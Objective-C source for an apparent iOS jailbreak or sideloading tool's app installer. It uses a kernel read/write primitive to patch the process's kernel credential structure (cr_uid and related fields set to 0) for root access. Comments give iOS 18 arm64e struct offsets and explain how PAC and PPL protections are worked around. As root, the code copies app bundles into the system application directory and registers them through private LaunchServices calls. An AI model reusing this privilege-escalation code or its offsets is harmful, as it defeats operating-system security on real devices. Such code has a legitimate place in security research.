//
//  IPAInstaller.m
//  controller
//
//  Installation flow (A18 arm64e / iOS 18.7.1)
//  -------------------------------------------
//
//  grant_root_to_pid()     → -99 (GRANT_ROOT_ERR_PAC_ARM64E)
//    proc_ro is PPL-protected; pointer swap would PAC-trap immediately.
//
//  launchd RemoteCall      → kernel panic
//    TRO swap into PID 1 succeeded, but first RemoteArbCall (malloc in
//    launchd's thread) triggered a PAC authentication fault.  launchd crash
//    = kernel panic = device reboot.
//
//  selfroot_elevate()      ← THIS FILE'S APPROACH
//    ucred (struct kauth_cred) lives in normal zone heap — NOT PPL-protected.
//    We only READ proc_ro (to find ucred) and WRITE to ucred fields (cr_uid,
//    cr_ruid, cr_svuid), never writing to proc_ro itself.  uid=0 bypasses all
//    DAC checks (suser() in XNU).  We restore the original values immediately
//    after the install completes so the process returns to uid=501.
//
//  ucred layout (iOS 18 arm64e, confirmed from session logs):
//    struct kauth_cred {
//      TAILQ_ENTRY(…)  cr_link;        // +0x00, 16 bytes (2 pointers)
//      u_long          cr_ref;          // +0x10, 8 bytes
//      struct posix_cred {
//        uid_t   cr_uid;                // +0x18  ← we write 0 here
//        uid_t   cr_ruid;               // +0x1c  ← and here
//        uid_t   cr_svuid;              // +0x20  ← and here
//        short   cr_ngroups;            // +0x24
//        //      2 bytes padding        // +0x26
//        gid_t   cr_groups[NGROUPS];    // +0x28 … +0x64  (16 × 4 bytes)
//        gid_t   cr_rgid;               // +0x68  ← and here
//        gid_t   cr_svgid;              // +0x6c
//        uid_t   cr_gmuid;              // +0x70
//        int     cr_flags;              // +0x74
//      };
//      struct label   *cr_label;        // +0x78 (verified: sbx log shows
//                                       //  label at ucred+0x78 for run 2)
//    };
//
//  proc_ro layout (confirmed from sbx session log):
//    proc_ro+0x28 → SMR pointer to ucred
//
//  proc → proc_ro: On arm64e the proc_ro pointer is PAC-signed with address
//    diversity.  Use sbx_ucredbyproc() which applies xpaci()+signptr() before
//    scanning — this is why the old ds_kreadsmrptr() scan always returned 0
//    on A18 (it strips SMR tags but NOT PAC bits, so ds_isvalid() rejects the
//    raw PAC-tagged value and the loop exits empty-handed).
//

#import <Foundation/Foundation.h>
#include "vfs.h"
#include "darksword.h"
#include "root.h"
#include "sbx.h"
#import <UIKit/UIKit.h>
#import <objc/message.h>
#include <unistd.h>
#include <sys/stat.h>
#include <errno.h>

#define CTRL_STAGING_DIR     @"/var/mobile/Library/ctrl_staging"
#define CTRL_CANONICAL_BASE  @"/var/containers/Bundle/Application"

// ─────────────────────────────────────────────────────────────────
//  Self-root via direct ucred patch (no RemoteCall, no PPL write)
// ─────────────────────────────────────────────────────────────────

static uint64_t g_ucred_addr  = 0;
static uint32_t g_orig_uid    = 0;
static uint32_t g_orig_ruid   = 0;
static uint32_t g_orig_svuid  = 0;
static uint32_t g_orig_rgid   = 0;

// Locate our kauth_cred via sbx_ucredbyproc().
//
// On arm64e (A18) the proc_ro pointer stored in proc is PAC-signed with
// address diversity.  The old approach used ds_kreadsmrptr() which strips
// SMR tags but does NOT strip PAC bits, causing ds_isvalid() to reject the
// value and the scan to return 0 every time.
//
// sbx_ucredbyproc() applies xpaci()+signptr() (the S() macro) before
// dereferencing proc_ro, and uses kreadsmrguess() for the ucred pointer
// within proc_ro — both of which handle arm64e PAC correctly.
static uint64_t selfroot_find_ucred(void) {
    uint64_t proc = ds_get_our_proc();
    if (!proc) {
        printf("[selfroot] ds_get_our_proc returned 0\n");
        return 0;
    }
    printf("[selfroot] proc=0x%llx\n", (unsigned long long)proc);

    // Delegate to sbx_ucredbyproc which handles arm64e PAC-signed proc_ro.
    uint64_t ucred = sbx_ucredbyproc(proc);
    if (!ucred) {
        printf("[selfroot] ucred scan failed (my_uid=%u)\n", getuid());
        return 0;
    }

    printf("[selfroot] found ucred=0x%llx (uid in struct=%u)\n",
           (unsigned long long)ucred, ds_kread32(ucred + 0x18));
    return ucred;
}

static int selfroot_elevate(void) {
    if (!ds_is_ready()) {
        printf("[selfroot] KRW not ready\n");
        return -1;
    }

    g_ucred_addr = selfroot_find_ucred();
    if (!g_ucred_addr) return -1;

    // Save original credential values
    g_orig_uid   = ds_kread32(g_ucred_addr + 0x18);
    g_orig_ruid  = ds_kread32(g_ucred_addr + 0x1c);
    g_orig_svuid = ds_kread32(g_ucred_addr + 0x20);
    g_orig_rgid  = ds_kread32(g_ucred_addr + 0x68);

    printf("[selfroot] elevating uid=%u ruid=%u svuid=%u -> 0\n",
           g_orig_uid, g_orig_ruid, g_orig_svuid);

    // Patch to root.  uid=0 causes suser() to return 0 in XNU's vfs_authorize,
    // bypassing DAC checks.  ucred is normal zone heap — no PPL write needed.
    ds_kwrite32(g_ucred_addr + 0x18, 0);  // cr_uid   = 0
    ds_kwrite32(g_ucred_addr + 0x1c, 0);  // cr_ruid  = 0
    ds_kwrite32(g_ucred_addr + 0x20, 0);  // cr_svuid = 0
    ds_kwrite32(g_ucred_addr + 0x68, 0);  // cr_rgid  = 0

    // Verify the patch took effect — if getuid() is still non-zero the
    // ds_kwrite32 calls silently failed (e.g. memory became PPL-protected
    // in a newer kernel build) and we must not claim success.
    uid_t post_uid = getuid();
    if (post_uid != 0) {
        printf("[selfroot] ucred write did not take effect (getuid=%u) — restoring\n", post_uid);
        ds_kwrite32(g_ucred_addr + 0x18, g_orig_uid);
        ds_kwrite32(g_ucred_addr + 0x1c, g_orig_ruid);
        ds_kwrite32(g_ucred_addr + 0x20, g_orig_svuid);
        ds_kwrite32(g_ucred_addr + 0x68, g_orig_rgid);
        g_ucred_addr = 0;
        return -2;
    }

    printf("[selfroot] running as uid=0\n");
    return 0;
}

static void selfroot_restore(void) {
    if (!g_ucred_addr) return;

    ds_kwrite32(g_ucred_addr + 0x18, g_orig_uid);
    ds_kwrite32(g_ucred_addr + 0x1c, g_orig_ruid);
    ds_kwrite32(g_ucred_addr + 0x20, g_orig_svuid);
    ds_kwrite32(g_ucred_addr + 0x68, g_orig_rgid);

    printf("[selfroot] restored uid=%u ruid=%u\n", g_orig_uid, g_orig_ruid);
    g_ucred_addr = 0;
}

// ─────────────────────────────────────────────────────────────────
//  Recursive bundle copy (plain NSFileManager, no RemoteCall)
// ─────────────────────────────────────────────────────────────────

static int copy_bundle_recursive(NSString *srcDir, NSString *dstDir) {
    NSFileManager *fm = [NSFileManager defaultManager];

    NSError *mkErr = nil;
    if (![fm createDirectoryAtPath:dstDir withIntermediateDirectories:YES
             attributes:nil error:&mkErr]) {
        printf("[controller] mkdir failed %s: %s\n",
               dstDir.UTF8String, mkErr.localizedDescription.UTF8String);
        return -11;
    }

    NSError *listErr = nil;
    NSArray *items = [fm contentsOfDirectoryAtPath:srcDir error:&listErr];
    if (!items) {
        printf("[controller] listdir failed %s: %s\n",
               srcDir.UTF8String, listErr.localizedDescription.UTF8String);
        return -12;
    }

    for (NSString *item in items) {
        NSString *srcItem = [srcDir stringByAppendingPathComponent:item];
        NSString *dstItem = [dstDir stringByAppendingPathComponent:item];
        BOOL isDir = NO;
        [fm fileExistsAtPath:srcItem isDirectory:&isDir];

        if (isDir) {
            int r = copy_bundle_recursive(srcItem, dstItem);
            if (r != 0) return r;
        } else {
            NSError *cpErr = nil;
            if (![fm copyItemAtPath:srcItem toPath:dstItem error:&cpErr]) {
                printf("[controller] copyItem failed %s -> %s: %s\n",
                       srcItem.UTF8String, dstItem.UTF8String,
                       cpErr.localizedDescription.UTF8String);
                return -13;
            }
        }
    }
    return 0;
}

// ─────────────────────────────────────────────────────────────────
//  MCM container metadata plist
// ─────────────────────────────────────────────────────────────────
// Mobile Container Manager (MCM) expects a hidden plist in the container dir.
// Without it LSApplicationWorkspace may refuse to register the app.

static void write_container_metadata(NSString *containerDir,
                                     NSString *bundleID,
                                     NSString *uuid) {
    NSString *metaPath = [containerDir stringByAppendingPathComponent:
                          @".com.apple.mobile_container_manager.metadata.plist"];
    NSDictionary *meta = @{
        @"MCMMetadataIdentifier":    bundleID,
        @"MCMMetadataContentClass":  @"com.apple.MobileContainerManager.application",
        @"MCMMetadataUUID":          uuid,
    };
    NSError *writeErr = nil;
    NSData *plistData = [NSPropertyListSerialization
                         dataWithPropertyList:meta
                         format:NSPropertyListXMLFormat_v1_0
                         options:0
                         error:&writeErr];
    if (!plistData) {
        printf("[controller] metadata plist serialization failed: %s\n",
               writeErr.localizedDescription.UTF8String);
        return;
    }
    if (![plistData writeToFile:metaPath atomically:YES]) {
        printf("[controller] metadata plist write failed at %s\n", metaPath.UTF8String);
    } else {
        printf("[controller] wrote MCM metadata plist: %s\n", metaPath.UTF8String);
    }
}

// ─────────────────────────────────────────────────────────────────
//  Permission fixup
// ─────────────────────────────────────────────────────────────────

static void fix_permissions_recursive(NSString *path) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSDictionary *da = @{NSFilePosixPermissions: @(0755)};
    NSDictionary *fa = @{NSFilePosixPermissions: @(0644)};
    [fm setAttributes:da ofItemAtPath:path error:nil];
    NSDirectoryEnumerator *en = [fm enumeratorAtPath:path];
    NSString *item;
    while ((item = [en nextObject])) {
        NSString *full = [path stringByAppendingPathComponent:item];
        BOOL isDir = NO;
        [fm fileExistsAtPath:full isDirectory:&isDir];
        [fm setAttributes:(isDir ? da : fa) ofItemAtPath:full error:nil];
    }
}

// ─────────────────────────────────────────────────────────────────
//  Main install entry point
// ─────────────────────────────────────────────────────────────────

int install_app_bundle(const char *appBundlePath) {
    if (!ds_is_ready()) {
        printf("[controller] install: KRW not ready\n");
        return -1;
    }

    NSString *srcPath = [NSString stringWithUTF8String:appBundlePath];
    NSString *appName = [srcPath lastPathComponent];
    NSString *destUUID = [[NSUUID UUID] UUIDString];
    NSFileManager *fm = [NSFileManager defaultManager];

    printf("[controller] install: src=%s app=%s uuid=%s\n",
           appBundlePath, appName.UTF8String, destUUID.UTF8String);

    // ── Step 1: elevate to root via ucred patch ──────────────────
    // We patch cr_uid/cr_ruid/cr_svuid in our kauth_cred to 0.
    // ucred is regular zone heap — NOT PPL-protected.
    // uid=0 causes XNU's suser() to bypass DAC, letting us create
    // directories in /var/containers/Bundle/Application/ (owned by
    // _installd uid=33, mode 0750 — inaccessible to uid=501 mobile).
    //
    // FIX: selfroot_find_ucred() now delegates to sbx_ucredbyproc()
    // which correctly handles the arm64e PAC-signed proc_ro pointer
    // via xpaci()+signptr().  The old ds_kreadsmrptr() call stripped
    // SMR tags but not PAC bits, so ds_isvalid() always rejected the
    // value and the scan returned 0 on every A18 run.
    //
    // We restore original values before returning.
    BOOL elevated = (selfroot_elevate() == 0);
    if (!elevated) {
        printf("[controller] selfroot elevation failed — will try staging fallback\n");
    } else {
        printf("[controller] running as uid=0 for install\n");
    }

    // ── Step 2: pick install destination ────────────────────────
    NSString *destDir, *destApp;
    BOOL useCanonical = NO;

    if (elevated) {
        NSString *canonDir = [CTRL_CANONICAL_BASE
                              stringByAppendingPathComponent:destUUID];
        NSError *mkErr = nil;
        if ([fm createDirectoryAtPath:canonDir
              withIntermediateDirectories:YES
              attributes:nil
              error:&mkErr]) {
            destDir      = canonDir;
            destApp      = [destDir stringByAppendingPathComponent:appName];
            useCanonical = YES;
            printf("[controller] canonical install dir: %s\n", destDir.UTF8String);
        } else {
            printf("[controller] canonical mkdir failed: %s\n",
                   mkErr.localizedDescription.UTF8String);
        }
    }

    if (!useCanonical) {
        // Staging fallback — /var/mobile/Library/ is always mobile-writable
        destDir = [CTRL_STAGING_DIR stringByAppendingPathComponent:destUUID];
        destApp = [destDir stringByAppendingPathComponent:appName];
        [fm createDirectoryAtPath:CTRL_STAGING_DIR
           withIntermediateDirectories:YES attributes:nil error:nil];
        printf("[controller] using staging dir: %s\n", destDir.UTF8String);
    }

    // ── Step 3: copy bundle (still elevated if applicable) ───────
    printf("[controller] copying bundle...\n");
    int copyErr = copy_bundle_recursive(srcPath, destApp);
    if (copyErr != 0) {
        printf("[controller] copy_bundle_recursive failed: %d\n", copyErr);
        if (useCanonical) {
            // Retry via staging with elevation still active
            printf("[controller] retrying to staging\n");
            destDir = [CTRL_STAGING_DIR stringByAppendingPathComponent:destUUID];
            destApp = [destDir stringByAppendingPathComponent:appName];
            [fm createDirectoryAtPath:CTRL_STAGING_DIR
               withIntermediateDirectories:YES attributes:nil error:nil];
            copyErr = copy_bundle_recursive(srcPath, destApp);
            if (copyErr != 0) {
                printf("[controller] staging fallback copy also failed: %d\n", copyErr);
                selfroot_restore();
                return copyErr;
            }
            useCanonical = NO;
        } else {
            selfroot_restore();
            return copyErr;
        }
    }
    printf("[controller] copy done -> %s\n", destApp.UTF8String);

    // ── Step 4: fix permissions and write MCM metadata ───────────
    fix_permissions_recursive(destApp);

    // Read Info.plist NOW — we need bundleID for metadata plist
    NSString *infoPlistPath = [destApp stringByAppendingPathComponent:@"Info.plist"];
    NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:infoPlistPath];
    NSString *bundleID   = info[@"CFBundleIdentifier"] ?: @"unknown";
    NSString *bundleName = info[@"CFBundleDisplayName"]
                        ?: info[@"CFBundleName"]
                        ?: bundleID;
    NSString *version    = info[@"CFBundleShortVersionString"] ?: @"1.0";
    NSString *executable = info[@"CFBundleExecutable"] ?: bundleName;
    NSString *minOS      = info[@"MinimumOSVersion"]   ?: @"17.0";

    printf("[controller] bundle: %s (%s) v%s\n",
           bundleName.UTF8String, bundleID.UTF8String, version.UTF8String);

    // Write MCM metadata plist into the CONTAINER dir (parent of .app bundle)
    write_container_metadata(destDir, bundleID, destUUID);

    // ── Step 5: restore uid BEFORE calling into LS ───────────────
    // LSApplicationWorkspace and notification calls don't need root.
    selfroot_restore();

    // ── Step 6: register with LSApplicationWorkspace ─────────────
    Class workspace = NSClassFromString(@"LSApplicationWorkspace");
    id ws = [workspace performSelector:@selector(defaultWorkspace)];

    NSDictionary *appDict = @{
        @"Path":                destApp,
        @"ApplicationType":     @"User",
        @"CFBundleIdentifier":  bundleID,
        @"CFBundleDisplayName": bundleName,
        @"CFBundleName":        bundleName,
        @"CFBundleVersion":     version,
        @"CFBundleExecutable":  executable,
        @"MinimumOSVersion":    minOS,
        @"IsDeletable":         @YES,
        @"IsUpgradeable":       @YES,
        @"LSInstallType":       @(1),
    };

    BOOL registered = NO;

    SEL regSel = NSSelectorFromString(@"registerApplicationDictionary:");
    if ([ws respondsToSelector:regSel]) {
        registered = ((BOOL (*)(id, SEL, id))objc_msgSend)(ws, regSel, appDict);
        printf("[controller] registerApplicationDictionary: %s\n",
               registered ? "YES" : "NO");
    }

    if (!registered) {
        SEL rebuildSel = NSSelectorFromString(
            @"_LSPrivateRebuildApplicationDatabasesForSystemApps:registeringPlugins:");
        if ([ws respondsToSelector:rebuildSel]) {
            ((void (*)(id, SEL, BOOL, BOOL))objc_msgSend)(ws, rebuildSel, YES, YES);
            registered = YES;
            printf("[controller] triggered _LSPrivateRebuildApplicationDatabases\n");
        }
    }

    // Notify SpringBoard of the newly installed app
    if (registered) {
        SEL notifySel = NSSelectorFromString(@"_sendApplicationInstalledNotification:");
        if ([ws respondsToSelector:notifySel]) {
            ((void (*)(id, SEL, id))objc_msgSend)(ws, notifySel, bundleID);
            printf("[controller] sent installed notification for %s\n", bundleID.UTF8String);
        }
    }

    // ── Step 7: persist install record ───────────────────────────
    NSMutableArray *installed = [[NSUserDefaults.standardUserDefaults
        stringArrayForKey:@"ctrl_installed_apps"] mutableCopy] ?: [NSMutableArray new];
    if (![installed containsObject:bundleID]) [installed addObject:bundleID];
    [NSUserDefaults.standardUserDefaults setObject:installed forKey:@"ctrl_installed_apps"];

    printf("[controller] install complete: %s (%s) -> %s (registered=%s canonical=%s)\n",
           bundleName.UTF8String, bundleID.UTF8String, destApp.UTF8String,
           registered ? "YES" : "NO",
           useCanonical ? "YES" : "NO");

    return registered ? 0 : -4;
}

int uninstall_app(const char *bundleID) {
    NSString *bid = [NSString stringWithUTF8String:bundleID];
    Class workspace = NSClassFromString(@"LSApplicationWorkspace");
    id ws = [workspace performSelector:@selector(defaultWorkspace)];
    BOOL result = [[ws performSelector:@selector(uninstallApplication:withOptions:)
                            withObject:bid withObject:nil] boolValue];

    if (result) {
        NSMutableArray *installed = [[NSUserDefaults.standardUserDefaults
            stringArrayForKey:@"ctrl_installed_apps"] mutableCopy] ?: [NSMutableArray new];
        [installed removeObject:bid];
        [NSUserDefaults.standardUserDefaults setObject:installed forKey:@"ctrl_installed_apps"];

        // Clean up staging leftovers for this bundle
        NSFileManager *fm = [NSFileManager defaultManager];
        NSArray *dirs = [fm contentsOfDirectoryAtPath:CTRL_STAGING_DIR error:nil] ?: @[];
        for (NSString *d in dirs) {
            NSString *full = [CTRL_STAGING_DIR stringByAppendingPathComponent:d];
            NSArray *apps  = [fm contentsOfDirectoryAtPath:full error:nil] ?: @[];
            for (NSString *app in apps) {
                NSString *ip = [[full stringByAppendingPathComponent:app]
                                    stringByAppendingPathComponent:@"Info.plist"];
                NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:ip];
                if ([info[@"CFBundleIdentifier"] isEqualToString:bid])
                    [fm removeItemAtPath:full error:nil];
            }
        }
    }
    return result ? 0 : -1;
}
